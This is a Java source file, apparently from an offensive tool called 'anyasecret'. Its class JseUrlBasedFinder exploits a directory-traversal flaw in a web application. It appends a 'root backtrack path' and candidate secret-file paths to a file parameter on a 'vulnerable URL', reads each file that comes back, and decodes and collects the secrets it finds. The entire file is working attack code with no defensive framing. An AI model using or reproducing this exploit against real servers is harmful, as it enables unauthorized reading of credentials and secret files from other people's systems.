package io.javaside.anyasecret;

import io.javaside.anyasecret.exception.AnyaSecretException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

class JseUrlBasedFinder extends AnyaSecretFinder {

    private static final Logger logger = LoggerFactory.getLogger(JseUrlBasedFinder.class);

    @Override
    public Map<String, String> findSecrets() {
        var result = new HashMap<String, String>();
        for (var secretDir : getPotentialSecretDirs()) {
            var secretPath = secretDir + getSecretFileName();
            logger.debug("Trying to find secrets in {}", secretPath);
            try (var inStream = buildUrlWith(secretPath).openStream()) {
                var secrets = getExtractor().extractFrom(inStream)
                        .stream()
                        .map(this::decodeSecret)
                        .filter(getValidator()::validate)
                        .collect(Collectors.toList());
                writeSecrets(result, secretPath, secrets);
            }
            catch (IOException e) {
                throw new AnyaSecretException("Failed to vulnerable url");
            }
        }
        return result;
    }

    private URL buildUrlWith(String secretPath) throws MalformedURLException {
        String urlString = getVulnerableUrl() + "?" +
                getFileParamKey() +
                "=" +
                getRootBacktrackPath() +
                secretPath;
        return URI.create(urlString).toURL();
    }

    private void writeSecrets(Map<String, String> secretMap, String secretPath, List<String> secrets) {
        for (int i = 0; i < secrets.size(); i++) {
            var secret = secrets.get(i);
            var secretKey = i == 0 ? secretPath : secretPath + "-" + (i + 1);
            secretMap.put(secretKey, secret);
        }
    }
}






















